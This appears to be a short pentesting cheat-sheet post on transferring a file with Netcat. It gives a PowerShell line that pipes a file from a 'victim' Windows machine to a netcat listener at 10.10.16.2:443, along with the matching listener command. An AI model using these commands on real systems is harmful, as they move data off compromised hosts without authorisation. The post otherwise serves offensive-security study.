---
description: >-
  File transfer via Netcat.
title: Netcat File Transfer                 # Add title here
date: 2022-08-29 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer,  Windows - Netcat]                     # Change Templates to Writeup
tags: [file transfer, netcat, windows]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Transfer File
Output the exit of the file towards the netcat listener on the victim machine:
```powershell
type .\out.txt | .\nc.exe -nv 10.10.16.2 443
```
Then redirect the traffic towards the destination file:
```bash
nc -nlvp 443 > out.txt
```

